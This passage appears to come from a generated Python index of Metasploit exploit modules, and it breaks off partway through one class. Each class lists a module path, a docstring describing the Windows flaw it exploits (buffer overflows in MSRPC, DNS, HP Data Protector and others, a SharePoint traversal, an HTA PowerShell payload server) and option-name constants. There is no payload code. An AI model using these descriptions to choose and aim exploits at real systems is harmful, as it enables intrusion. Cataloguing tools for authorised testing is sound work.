		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'
			required_Attempts = 'Attempts'
			required_Wait = 'Wait'
			required_Jam = 'Jam'

	class windows_dcerpc_ms05_017_msmq(object):
		"""
		
        This module exploits a stack buffer overflow in the RPC interface
        to the Microsoft Message Queueing service. The offset to the
        return address changes based on the length of the system
        hostname, so this must be provided via the 'HNAME' option.
        Much thanks to snort.org and Jean-Baptiste Marchand's
        excellent MSRPC website.

      
		"""

		path = 'windows/dcerpc/ms05_017_msmq'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			DynamicSehRecord = 'DynamicSehRecord'
			required_HNAME = 'HNAME'

	class windows_dcerpc_ms07_029_msdns_zonename(object):
		"""
		
          This module exploits a stack buffer overflow in the RPC interface
        of the Microsoft DNS service. The vulnerability is triggered
        when a long zone name parameter is supplied that contains
        escaped octal strings. This module is capable of bypassing NX/DEP
        protection on Windows 2003 SP1/SP2.
      
		"""

		path = 'windows/dcerpc/ms07_029_msdns_zonename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_Locale = 'Locale'

	class windows_dcerpc_ms07_065_msmq(object):
		"""
		
        This module exploits a stack buffer overflow in the RPC interface
      to the Microsoft Message Queueing service. This exploit requires
      the target system to have been configured with a DNS name and
      for that name to be supplied in the 'DNAME' option. This name does
      not need to be served by a valid DNS server, only configured on
      the target machine.

      
		"""

		path = 'windows/dcerpc/ms07_065_msmq'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			DynamicSehRecord = 'DynamicSehRecord'
			required_DNAME = 'DNAME'

	class windows_dcerpc_ms03_026_dcom(object):
		"""
		
          This module exploits a stack buffer overflow in the RPCSS service, this vulnerability
        was originally found by the Last Stage of Delirium research group and has been
        widely exploited ever since. This module can exploit the English versions of
        Windows NT 4.0 SP3-6a, Windows 2000, Windows XP, and Windows 2003 all in one request :)
      
		"""

		path = 'windows/dcerpc/ms03_026_dcom'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'

	class windows_ssl_ms04_011_pct(object):
		"""
		
          This module exploits a buffer overflow in the Microsoft
        Windows SSL PCT protocol stack. This code is based on Johnny
        Cyberpunk's THC release and has been tested against Windows
        2000 and Windows XP. To use this module, specify the remote
        port of any SSL service, or the port and protocol of an
        application that uses SSL. The only application protocol
        supported at this time is SMTP. You only have one chance to
        select the correct target, if you are attacking IIS, you may
        want to try one of the other exploits first (WebDAV). If
        WebDAV does not work, this more than likely means that this
        is either Windows 2000 SP4+ or Windows XP (IIS 5.0 vs IIS
        5.1). Using the wrong target may not result in an immediate
        crash of the remote system.
      
		"""

		path = 'windows/ssl/ms04_011_pct'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_PROTO = 'PROTO'

	class windows_misc_citrix_streamprocess_get_objects(object):
		"""
		
          This module exploits a remote buffer overflow in the Citrix Provisioning Services
        5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet with the opcode
        0x40020006 (GetObjetsRequest) to the 6905/UDP port. The module, which allows code execution
        under the context of SYSTEM, has been successfully tested on Windows Server 2003 SP2
        and Windows XP SP3.
      
		"""

		path = 'windows/misc/citrix_streamprocess_get_objects'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_gimp_script_fu(object):
		"""
		
        This module exploits a buffer overflow in the script-fu server
        component on GIMP <= 2.6.12. By sending a specially crafted packet, an
        attacker may be able to achieve remote code execution under the context
        of the user.

        This module has been tested on GIMP for Windows from installers
        provided by Jernej Simoncic.
      
		"""

		path = 'windows/misc/gimp_script_fu'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_manageengine_eventlog_analyzer_rce(object):
		"""
		
        This module exploits a SQL query functionality in ManageEngine EventLog Analyzer v10.6
        build 10060 and previous versions. Every authenticated user, including the default "guest"
        account can execute SQL queries directly on the underlying Postgres database server. The
        queries are executed as the "postgres" user which has full privileges and thus is able to
        write files to disk. This way a JSP payload can be uploaded and executed with SYSTEM
        privileges on the web server. This module has been tested successfully on ManageEngine
        EventLog Analyzer 10.0 (build 10003) over Windows 7 SP1.
       
		"""

		path = 'windows/misc/manageengine_eventlog_analyzer_rce'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FileDropperDelay = 'FileDropperDelay'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_USERNAME = 'USERNAME'
			required_PASSWORD = 'PASSWORD'

	class windows_misc_bakbone_netvault_heap(object):
		"""
		
    This module exploits a heap overflow in the BakBone NetVault
  Process Manager service. This code is a direct port of the netvault.c
  code written by nolimit and BuzzDee.
      
		"""

		path = 'windows/misc/bakbone_netvault_heap'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_hp_magentservice(object):
		"""
		
          This module exploits a stack buffer overflow in HP Diagnostics Server
        magentservice.exe service. By sending a specially crafted packet, an attacker
        may be able to execute arbitrary code. Originally found and posted by
        AbdulAziz Harir via ZDI.
      
		"""

		path = 'windows/misc/hp_magentservice'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_achat_bof(object):
		"""
		
        This module exploits a Unicode SEH buffer overflow in Achat. By
        sending a crafted message to the default port 9256/UDP, it's possible to overwrite the
        SEH handler. Even when the exploit is reliable, it depends on timing since there are
        two threads overflowing the stack in the same time. This module has been tested on
        Achat v0.150 running on Windows XP SP3 and Windows 7.
      
		"""

		path = 'windows/misc/achat_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_hta_server(object):
		"""
		
        This module hosts an HTML Application (HTA) that when opened will run a
        payload via Powershell. When a user navigates to the HTA file they will
        be prompted by IE twice before the payload is executed.
      
		"""

		path = 'windows/misc/hta_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'

	class windows_misc_hp_omniinet_3(object):
		"""
		
          This module exploits a  buffer overflow in the Hewlett-Packard
        OmniInet NT Service. By sending a specially crafted opcode 27 packet,
        a remote attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/misc/hp_omniinet_3'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_hp_omniinet_2(object):
		"""
		
          This module exploits a stack-based buffer overflow in the Hewlett-Packard
        OmniInet NT Service. By sending a specially crafted MSG_PROTOCOL (0x010b)
        packet, a remote attacker may be able to execute arbitrary code with elevated
        privileges.

        This service is installed with HP OpenView Data Protector, HP Application
        Recovery Manager and potentially other products. This exploit has been tested
        against versions 6.1, 6.0, and 5.50 of Data Protector. and versions 6.0 and 6.1
        of Application Recovery Manager.

        NOTE: There are actually two consecutive wcscpy() calls in the program (which
        may be why ZDI considered them two separate issues). However, this module only
        exploits the second one.
      
		"""

		path = 'windows/misc/hp_omniinet_2'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_eureka_mail_err(object):
		"""
		
        This module exploits a buffer overflow in the Eureka Email 2.2q
        client that is triggered through an excessively long ERR message.

        NOTE: this exploit isn't very reliable. Unfortunately reaching the
        vulnerable code can only be done when manually checking mail (Ctrl-M).
        Checking at startup will not reach the code targeted here.
      
		"""

		path = 'windows/misc/eureka_mail_err'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_bcaaa_bof(object):
		"""
		
          This module exploits a stack buffer overflow in process bcaaa-130.exe (port 16102),
        which comes as part of the Blue Coat Authentication proxy.  Please note that by default,
        this exploit will attempt up to three times in order to successfully gain remote code
        execution (in some cases, it takes as many as five times).  This can cause your activity
        to look even more suspicious.  To modify the number of exploit attempts, set the
        ATTEMPTS option.
      
		"""

		path = 'windows/misc/bcaaa_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_ATTEMPTS = 'ATTEMPTS'

	class windows_misc_doubletake(object):
		"""
		
          This module exploits a stack buffer overflow in the authentication mechanism of
          NSI Doubletake which is also rebranded as HP Storage Works. This vulnerability
          was found by Titon of Bastard Labs.
      
		"""

		path = 'windows/misc/doubletake'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_hp_dataprotector_new_folder(object):
		"""
		
          This module exploits a stack buffer overflow in HP Data Protector 5. The overflow
        occurs in the creation of new folders, where the name of the folder is handled in a
        insecure way by the dpwindtb.dll component. While the overflow occurs in the stack, the
        folder name is split in fragments in this insecure copy. Because of this, this module
        uses egg hunting to search a non corrupted copy of the payload in the heap. On the other
        hand the overflowed buffer is stored in a frame protected by stack cookies, because of
        this SEH handler overwrite is used.

        Any user of HP Data Protector Express is able to create new folders and trigger the
        vulnerability. Moreover, in the default installation the 'Admin' user has an empty
        password. Successful exploitation will lead to code execution with the privileges of
        the "dpwinsdr.exe" (HP Data Protector Express Domain Server Service) process, which
        runs as SYSTEM by default.
      
		"""

		path = 'windows/misc/hp_dataprotector_new_folder'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'
			required_USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'

	class windows_misc_bigant_server_sch_dupf_bof(object):
		"""
		
          This exploits a stack buffer overflow in BigAnt Server 2.97 SP7. The
        vulnerability is due to the dangerous usage of strcpy while handling errors. This
        module uses a combination of SCH and DUPF request to trigger the vulnerability, and
        has been tested successfully against version 2.97 SP7 over Windows XP SP3 and
        Windows 2003 SP2.
      
		"""

		path = 'windows/misc/bigant_server_sch_dupf_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_ms10_104_sharepoint(object):
		"""
		
          This module exploits a vulnerability found in SharePoint Server 2007 SP2. The
        software contains a directory traversal, that allows a remote attacker to write
        arbitrary files to the filesystem, sending a specially crafted SOAP ConvertFile
        request to the Office Document Conversions Launcher Service, which results in code
        execution under the context of 'SYSTEM'.

        The module uses the Windows Management Instrumentation service to execute an
        arbitrary payload on vulnerable installations of SharePoint on Windows 2003 Servers.
        It has been successfully tested on Office SharePoint Server 2007 SP2 over Windows
        2003 SP2.
      
		"""

		path = 'windows/misc/ms10_104_sharepoint'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_DEPTH = 'DEPTH'

	class windows_misc_hp_dataprotector_crs(object):
		"""
		
          This module exploits a stack-based buffer overflow in the Hewlett-Packard Data Protector
        product. The vulnerability, due to the insecure usage of _swprintf, exists at the Cell
        Request Service (crs.exe) when parsing packets with opcode 211. This module has been tested
        successfully on HP Data Protector 6.20 and 7.00 on Windows XP SP3.
      
		"""

		path = 'windows/misc/hp_dataprotector_crs'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
